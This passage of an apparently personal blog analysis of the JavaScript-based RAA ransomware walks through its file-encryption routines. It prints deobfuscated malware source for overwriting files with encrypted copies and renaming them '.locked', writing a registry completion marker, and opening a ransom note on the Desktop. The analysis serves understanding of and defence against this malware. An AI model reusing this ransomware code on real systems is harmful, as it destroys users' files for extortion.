* if file size is more than 4,76 MB and less than 476 MB - **qqJ()** function is called with file name as an argument

* otherwise, if file size is less than or equal 6122 bytes - file content read in line:

```
hXpHGpZ[0][0] = SlSPWu.ReadText;
``` 

and **hXpHGpZ** array is passed to **jMvqmKSQu()** function. 

Files bigger than 476 MB are ommited.

Let's see what **jMvqmKSQu()** and **qqJ()** called here are doing:

```javascript
function jMvqmKSQu(hXpHGpZ) {
    if (hXpHGpZ[1].length != 0) {
        var DftonCbPCyQR = hXpHGpZ[0].join("");
        DftonCbPCyQR = ukBnxEOtjm(DftonCbPCyQR);
        DftonCbPCyQR = DftonCbPCyQR + "=END=OF=HEADER=";
        DftonCbPCyQR = DftonCbPCyQR + hXpHGpZ[1].join("") + "IDNUM=" + cVjZujcP + "KEY_LOGIC=" + HZtSmFNRdJM_data[0] + "IV_LOGIC=" + qPCIyff[0] + "LOGIC_ID=1";
        omaDplUyHou(DftonCbPCyQR);
    } else if (hXpHGpZ == 0) {
        var DftonCbPCyQR = 0;
        omaDplUyHou(DftonCbPCyQR);
    } else {
        var DftonCbPCyQR = hXpHGpZ[0][0];
        DftonCbPCyQR = ukBnxEOtjm(DftonCbPCyQR);
        DftonCbPCyQR = DftonCbPCyQR + "IDNUM=" + cVjZujcP + "KEY_LOGIC=" + HZtSmFNRdJM_data[0] + "IV_LOGIC=" + qPCIyff[0] + "LOGIC_ID=2";
        omaDplUyHou(DftonCbPCyQR);
    }
    return DftonCbPCyQR;
}
```

Depends on content of **hXpHGpZ**, which can be two dimensional array or 0, different actions are taken. Anyway, finally file is being encrypted in function **ukBnxEOtjm()** and after that **omaDplUyHou()** function is called:

```javascript
function omaDplUyHou(lsYZxzUm) {
    var IxC = new ActiveXObject('ADODB.Stream');
    IxC.Type = 2;
    IxC.Charset = "437";
    IxC.Open();
    if (lsYZxzUm != 0) {
        IxC.WriteText(lsYZxzUm);
        IxC.SaveToFile(IMhTname, 2);
        IxC.Close();
        var DmYbWSaT = new ActiveXObject("Scripting.FileSystemObject");
        DmYbWSaT.MoveFile(IMhTname, IMhTname += ".locked");
    } else {
        IxC.Close();
    }
    return 0;
}
```

This function takes encrypted file, creates new _ADODB.Stream_ object and uses it to save that file into new one, adding extension _.locked_ at the end of original name.

```javascript
var DmYbWSaT = new ActiveXObject("Scripting.FileSystemObject");
DmYbWSaT.MoveFile(IMhTname, IMhTname += ".locked");
```
Method _MoveFile_ (https://msdn.microsoft.com/en-us/library/2wcf3ba6(v=vs.84).aspx) is responsible for the worst part of whole operation: it takes two arguments, source name and destination name,
and overrides original, not encrypted file name with the new, encrypted version.

Second function used in encryption process is 

```javascript
function qqJ(IMhTname) {
    var SlSPWu = WScript.CreateObject("ADODB.Stream");
    SlSPWu.CharSet = '437';
    SlSPWu.Open();
    SlSPWu.LoadFromFile(IMhTname);
    var FhDYKCTNZFu = WScript.CreateObject("ADODB.Stream");
    FhDYKCTNZFu.CharSet = '437';
    FhDYKCTNZFu.Open();
    var GinRqOjln = OQlYdejWlC(90000, 125000);
    var PRuJZyAvfeza = SlSPWu.Size;
    var VVe = SlSPWu.ReadText(GinRqOjln);
    var cBKyRXWGPWBs = ukBnxEOtjm(VVe);
    cBKyRXWGPWBs = String(cBKyRXWGPWBs);
    var rMkTeqZm = cBKyRXWGPWBs.length;
    SlSPWu.Position = PRuJZyAvfeza - GinRqOjln;
    var ECgBWYtoib = SlSPWu.ReadText(GinRqOjln);
    var AblANuF = ukBnxEOtjm(ECgBWYtoib);
    AblANuF = String(AblANuF);
    var QfYmGGcYOFB = AblANuF.length;
    var IJDZ = ",";
    SlSPWu.Position = PRuJZyAvfeza - GinRqOjln;
    SlSPWu.SetEOS;
    SlSPWu.WriteText(cBKyRXWGPWBs);
    SlSPWu.WriteText(AblANuF);
    SlSPWu.WriteText(rMkTeqZm);
    SlSPWu.WriteText(IJDZ);
    SlSPWu.WriteText(QfYmGGcYOFB);
    SlSPWu.WriteText(IJDZ);
    var ids = "IDNUM=" + cVjZujcP + "KEY_LOGIC=" + HZtSmFNRdJM_data[0] + "IV_LOGIC=" + qPCIyff[0] + "LOGIC_ID=3";
    SlSPWu.WriteText(ids);
    SlSPWu.Position = GinRqOjln;
    SlSPWu.CopyTo(FhDYKCTNZFu);
    SlSPWu.Close;
    FhDYKCTNZFu.SaveToFile(IMhTname, 2);
    FhDYKCTNZFu.Close;
    var DmYbWSaT = new ActiveXObject("Scripting.FileSystemObject");
    DmYbWSaT.MoveFile(IMhTname, IMhTname += ".locked");
    return 0;
}
```

This function, as mentioned earlier, is responsible for encryption process of files bigger than 4,76 MB and smaller than 476 MB.

It works little different than previous one. First of all, it creates two Windows Script _ADODB.Stream_ objects and content of file to encrypt is loaded into **SlSPWu** with _LoadFromFile()_ method:

```javascript
var SlSPWu = WScript.CreateObject("ADODB.Stream");
SlSPWu.CharSet = '437';
SlSPWu.Open();
SlSPWu.LoadFromFile(IMhTname);
var FhDYKCTNZFu = WScript.CreateObject("ADODB.Stream");
FhDYKCTNZFu.CharSet = '437';
FhDYKCTNZFu.Open();
```

Next, file is being encrypted in chunks:

```javascript
var GinRqOjln = OQlYdejWlC(90000, 125000);
var PRuJZyAvfeza = SlSPWu.Size;
var VVe = SlSPWu.ReadText(GinRqOjln);
var cBKyRXWGPWBs = ukBnxEOtjm(VVe);
cBKyRXWGPWBs = String(cBKyRXWGPWBs);
var rMkTeqZm = cBKyRXWGPWBs.length;
SlSPWu.Position = PRuJZyAvfeza - GinRqOjln;
var ECgBWYtoib = SlSPWu.ReadText(GinRqOjln);
var AblANuF = ukBnxEOtjm(ECgBWYtoib);
AblANuF = String(AblANuF);
var QfYmGGcYOFB = AblANuF.length;
var IJDZ = ",";
SlSPWu.Position = PRuJZyAvfeza - GinRqOjln;
SlSPWu.SetEOS;
```

Chunk size (**GinRqOjln**) is calculated from byte 0 to randomly selected byte between 90000 and 125000. Each chunk is encrypted result of encryption is assigned to a string by calling _String_ constructor directly on this result, eg. ```cBKyRXWGPWBs = String(cBKyRXWGPWBs);```

Everything, together with some additional information, like length of last string, is then write to **SlSPWu** stream:

```javascript
SlSPWu.WriteText(cBKyRXWGPWBs);
SlSPWu.WriteText(AblANuF);
SlSPWu.WriteText(rMkTeqZm);
SlSPWu.WriteText(IJDZ);
SlSPWu.WriteText(QfYmGGcYOFB);
SlSPWu.WriteText(IJDZ);
var ids = "IDNUM=" + cVjZujcP + "KEY_LOGIC=" + HZtSmFNRdJM_data[0] + "IV_LOGIC=" + qPCIyff[0] + "LOGIC_ID=3";
SlSPWu.WriteText(ids);
SlSPWu.Position = GinRqOjln;
```

Finally, content of **SlSPWu** stream is copied into **FhDYKCTNZFu**, and the same operation as in **omaDplUyHou()** is performed: change file name to the one with _.locked_ extension and then override original file with encrypted version.

--

### End of the process

When all files are encrypted, there are couple of lines left to execute in RAA.

First, Windows Registry is updated with entry that RAA finished its dirty job:

```javascript
var FYSAj = WScript.CreateObject("WScript.Shell");
FYSAj.RegWrite("HKCU\\RAA\\Raa-fnl\\", "beenFinished", "REG_SZ");
```

Next, _.rtf_ file with information message is copied into Desktop and opened with Wordpad:

```javascript
var IvTV = "C:\\" + "!!!README!!!" + TBucypWw + ".rtf";
var xfejSVYO = new ActiveXObject("Scripting.FileSystemObject");
var Nnz = FYSAj.SpecialFolders("Desktop");
Nnz = Nnz += "\\";
xfejSVYO.CopyFile(IvTV, Nnz);
var rdm_fl = "wordpad.exe" + " " + IvTV;
FYSAj.Run(rdm_fl, 3);
return 0;
```

This file contains information about where and how affected user can contact to get decryption key, after paying some amount of money, in Bitcoins.


## Summary

As a web developer, I used to write JavaScript code for a little bit different purposes. AngularJS, React, Single Page Applications, Node and server side JS as well - this stuff. 

But RAA confirms that JavaScript can be used for, literally, everything. Even for creating the worst nightmare of each user, which is ransomware. 

And not only RAA uses JavaScript for such things. @hasherezade recently described in details Locky ransomware downloader script, which is also created in JavaScript (see https://blog.malwarebytes.com/threat-analysis/2016/07/from-locky-with-love-reading-malicious-attachments/ )

Also, obfuscation of JavaScript code in similar malware is insane. In "Return of Locky" blogpost (https://malcat.moe/?p=53) you can follow process of deobfuscation Locky ransomware code. JavaScript variables and function names can be refer in many ways eg. object property identifier can be defined as concatenated string of mixed UTF, hexadecimal and plain text chunks, reverted, encoded and reverted once again.

But one fact is very important here: every single JavaScript runtime environment needs JavaScript code in plaintext to be able to  execute it. Any browser JavaScript engine, V8, node.js, io.js or even Windows Script Host. That simply means it is **always** possible to get any JavaScript obfuscated code into something readable and executable in Node.js or web browser.

--

### Get in touch maybe? :)

If you have any questions or doubts - feel free to contact me:

- Twitter: https://twitter.com/I_am_bl4de
- email: bloorq@gmail.com



## Links, references


Source code of RAA:

**malwr.com**
https://malwr.com/analysis/YmE4MDNlMzk2MjY3NDdlYWE1NzFiOTNlYzVhZTlkM2Y/


**SophosLabs blog**			

Sophos blog post about RAA:

https://nakedsecurity.sophos.com/2016/06/20/ransomware-thats-100-pure-javascript-no-download-required/



**RAA – An entirely new JS ransomware delivering Pony malware**

Very detailed analysis of RAA, by ReaQta:

https://reaqta.com/2016/06/raa-ransomware-delivering-pony/


**Locky downloader script analysis by @hasherezade**

